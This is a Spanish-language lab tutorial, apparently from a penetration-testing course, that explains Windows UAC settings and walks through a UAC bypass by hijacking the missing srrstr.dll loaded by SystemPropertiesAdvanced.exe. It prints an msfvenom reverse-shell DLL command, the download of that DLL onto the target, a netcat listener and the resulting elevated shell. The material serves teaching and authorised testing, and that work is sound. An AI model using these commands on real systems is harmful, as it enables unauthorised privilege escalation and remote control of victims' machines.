
# User Account Control (UAC)

[El Control de cuentas de usuario (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una función que permite solicitar el consentimiento para actividades de alto nivel. Las aplicaciones tienen distintos niveles de `integridad` y un programa con un nivel alto puede realizar tareas que podrían comprometer el sistema. Cuando el UAC está habilitado, las aplicaciones y tareas siempre se ejecutan en el contexto de seguridad de una cuenta que no sea de administrador, a menos que un administrador autorice explícitamente que estas aplicaciones o tareas tengan acceso de nivel de administrador al sistema para ejecutarse. Es una función práctica que protege a los administradores de cambios no deseados, pero no se considera un límite de seguridad.

Cuando el UAC está activado, un usuario puede iniciar sesión en su sistema con su cuenta de usuario estándar. Cuando se inician procesos utilizando un token de usuario estándar, pueden realizar tareas utilizando los derechos otorgados a un usuario estándar. Algunas aplicaciones requieren permisos adicionales para ejecutarse y el UAC puede proporcionar derechos de acceso adicionales al token para que se ejecuten correctamente.

En esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) se explica en profundidad cómo funciona el UAC e incluye el proceso de inicio de sesión, la experiencia del usuario y la arquitectura del UAC. Los administradores pueden utilizar políticas de seguridad para configurar cómo funciona el UAC en su organización a nivel local (mediante secpol.msc), o configurarlo y enviarlo a través de objetos de política de grupo (GPO) en un entorno de dominio de Active Directory. Las distintas configuraciones se describen en detalle [aquí](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) . Hay 10 configuraciones de política de grupo que se pueden configurar para el UAC. La siguiente tabla proporciona detalles adicionales:

<table data-header-hidden><thead><tr><th width="372"></th><th></th><th></th></tr></thead><tbody><tr><td>Configuración de directiva de grupo</td><td>Clave de registro</td><td>Configuración predeterminada</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account">Control de cuentas de usuario: modo de aprobación de administrador para la cuenta de administrador integrada</a></td><td>FilterAdministratorToken</td><td>Desactivado</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop">Control de cuentas de usuario: permitir que las aplicaciones UIAccess soliciten elevación sin usar el escritorio seguro</a></td><td>EnableUIADesktopToggle</td><td>Desactivado</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode">Control de cuentas de usuario: comportamiento de la solicitud de elevación para administradores en el modo de aprobación de administrador</a></td><td>ConsentPromptBehaviorAdmin</td><td>Solicitud de consentimiento para archivos binarios que no sean de Windows</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users">Control de cuentas de usuario: comportamiento del mensaje de elevación para usuarios estándar</a></td><td>ConsentPromptBehaviorUser</td><td>Solicitar credenciales en el escritorio seguro</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation">Control de cuentas de usuario: detecta instalaciones de aplicaciones y solicita elevación</a></td><td>EnableInstallerDetection</td><td>Habilitado (predeterminado para el hogar) Deshabilitado (predeterminado para la empresa)</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated">Control de cuentas de usuario: eleve únicamente ejecutables que estén firmados y validados</a></td><td>ValidateAdminCodeSignatures</td><td>Desactivado</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations">Control de cuentas de usuario: eleve únicamente las aplicaciones UIAccess que estén instaladas en ubicaciones seguras</a></td><td>EnableSecureUIAPaths</td><td>Activado</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode">Control de cuentas de usuario: ejecutar todos los administradores en modo de aprobación de administrador</a></td><td>EnableLUA</td><td>Activado</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation">Control de cuentas de usuario: cambiar al escritorio seguro cuando se solicita elevación</a></td><td>PromptOnSecureDesktop</td><td>Activado</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations">Control de cuentas de usuario: virtualice los errores de escritura de archivos y registros en ubicaciones por usuario</a></td><td>EnableVirtualization</td><td>Activado</td></tr></tbody></table>

[Fuente](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings)

![imagen](https://academy.hackthebox.com/storage/modules/67/uac.png)

Se debe habilitar el UAC y, si bien puede que no impida que un atacante obtenga privilegios, es un paso adicional que puede ralentizar este proceso y obligarlo a ser más ruidoso.

La cuenta `default RID 500 administrator` siempre opera en el nivel obligatorio alto. Con el modo de aprobación de administrador (AAM) habilitado, todas las nuevas cuentas de administrador que creemos operarán en el nivel obligatorio medio de manera predeterminada y se les asignarán dos tokens de acceso independientes al iniciar sesión. En el siguiente ejemplo, la cuenta de usuario `sarah` está en el grupo de administradores, pero `cmd.exe` se está ejecutando actualmente en el contexto de su token de acceso sin privilegios.

### **Comprobar el usuario actual**

```powershell
C:\htb> whoami /user

USER INFORMATION
----------------

User Name         SID
================= ==============================================
winlpe-ws03\sarah S-1-5-21-3159276091-2191180989-3781274054-1002
```

### **Confirmar la membresía del grupo de administradores**

```powershell
C:\htb> net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
mrb3n
sarah
The command completed successfully.
```

### **Revisar los privilegios de usuario**

```powershell
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

### **Confirmar que el UAC está habilitado**

No existe una versión de línea de comandos del mensaje de consentimiento de la GUI, por lo que tendremos que omitir el UAC para ejecutar comandos con nuestro token de acceso privilegiado. Primero, confirmemos si el UAC está habilitado y, de ser así, en qué nivel.

```powershell
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

### **Comprobar nivel de UAC**

```cmd-session
C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

El valor de `ConsentPromptBehaviorAdmin` es `0x5`, lo que significa que el nivel más alto de UAC `Always notify` está habilitado. Hay menos omisiones de UAC en este nivel más alto.

### **Comprobar la versión de Windows**

UAC evita fallas de apalancamiento o funcionalidades no deseadas en diferentes compilaciones de Windows. Examinemos la compilación de Windows que queremos actualizar.

```powershell
PS C:\htb> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Esto devuelve la versión de compilación `14393`, que al usar [esta](https://en.wikipedia.org/wiki/Windows_10_version_history) página hacemos referencia cruzada con la versión de Windows `1607`.

![imagen](https://academy.hackthebox.com/storage/modules/67/build.png)

El proyecto [UACME](https://github.com/hfiref0x/UACME) mantiene una lista de omisiones de UAC, que incluye información sobre el número de compilación de Windows afectado, la técnica utilizada y si Microsoft ha publicado una actualización de seguridad para solucionarlo. Usemos la técnica número 54, que se afirma que funciona a partir de la compilación 14393 de Windows 10. Esta técnica apunta a la versión de 32 bits del binario de elevación automática `SystemPropertiesAdvanced.exe`. Hay muchos binarios confiables que Windows permitirá elevar automáticamente sin la necesidad de una solicitud de consentimiento de UAC.

Según [esta](https://egre55.github.io/system-properties-uac-bypass) publicación del blog, la versión de 32 bits `SystemPropertiesAdvanced.exe` intenta cargar la DLL inexistente `srrstr.dll`, que es utilizada por la funcionalidad Restaurar sistema.

Al intentar localizar una DLL, Windows utilizará el siguiente orden de búsqueda:

1. El directorio desde el que se cargó la aplicación.
2. El directorio del sistema `C:\Windows\System32` para sistemas de 64 bits.
3. El directorio del sistema de 16 bits `C:\Windows\System` (no compatible con sistemas de 64 bits)
4. El directorio de Windows.
5. Cualquier directorio que esté enumerado en la variable de entorno PATH.

### **Revisando la variable de path**

Examinemos la variable de ruta con el comando `cmd /c echo %PATH%`. Esto revela las carpetas predeterminadas que se muestran a continuación. La carpeta `WindowsApps` se encuentra dentro del perfil del usuario y el usuario puede escribir en ella.

```powershell
PS C:\htb> cmd /c echo %PATH%

C:\Windows\system32;
C:\Windows;
C:\Windows\System32\Wbem;
C:\Windows\System32\WindowsPowerShell\v1.0\;
C:\Users\sarah\AppData\Local\Microsoft\WindowsApps;
```

Potencialmente, podemos evitar el UAC mediante el secuestro de DLL colocando una DLL maliciosa `srrstr.dll` en una carpeta `WindowsApps` que se cargará en un contexto elevado.

### **Generación de DLL maliciosa srrstr.dll**

Primero, generemos una DLL para ejecutar un shell inverso.

```shell-session
afsh4ck@kali$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 5120 bytes
```

{% hint style="success" %}
**Nota**: En el ejemplo anterior, especificamos nuestra dirección IP VPN tun0, ya que estamos conectados por VPN
{% endhint %}

**Iniciar el servidor HTTP de Python en el host de ataque**

Copie la DLL generada a una carpeta y configure un miniservidor web Python para alojarla.

```shell-session
afsh4ck@kali$ sudo python3 -m http.server 8080
```

**Descargar DLL en el Target**

Descargue la DLL maliciosa al sistema de destino y configure un listener de `Netcat` en nuestra máquina de ataque.

```powershell
PS C:\htb> curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

**Iniciando listener de nc en el host de ataque**

```shell-session
afsh4ck@kali$ nc -lvnp 8443
```

**Conexión de prueba**

Si ejecutamos el archivo malicioso `srrstr.dll`, recibiremos un shell que muestra los derechos de usuario normales (UAC habilitado). Para probar esto, podemos ejecutar la DLL `rundll32.exe` para obtener una conexión de shell reversa.

```powershell
C:\htb> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

Una vez que recuperemos la conexión, veremos los derechos de usuario normales.

```bash
afsh4ck@kali$ nc -lnvp 8443

listening on [any] 8443 ...

connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 49789
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Users\sarah> whoami /priv

whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

**Ejecución de SystemPropertiesAdvanced.exe en el host de destino**

Antes de continuar, debemos asegurarnos de que se hayan finalizado todas las instancias del proceso `rundll32` de nuestra ejecución anterior.

```bash
C:\htb> tasklist /svc | findstr "rundll32"
rundll32.exe                  6300 N/A
rundll32.exe                  5360 N/A
rundll32.exe                  7044 N/A

C:\htb> taskkill /PID 6300 /F
SUCCESS: The process with PID 6300 has been terminated.

C:\htb> taskkill /PID 5360 /F
SUCCESS: The process with PID 5360 has been terminated.

C:\htb> taskkill /PID 7044 /F
SUCCESS: The process with PID 7044 has been terminated.
```

Ahora, podemos probar la versión de 32 bits `SystemPropertiesAdvanced.exe` desde el host de destino.

```powershell
C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

**Recibiendo la conexión reversa**

Al volver a verificar a nuestro listener, deberíamos recibir una conexión casi instantáneamente.

```bash
afsh4ck@kali$ nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami

whoami
winlpe-ws03\sarah


C:\Windows\system32> whoami /priv

whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

Esto se realiza correctamente y recibimos un shell elevado que muestra que nuestros privilegios están disponibles y pueden habilitarse si es necesario.
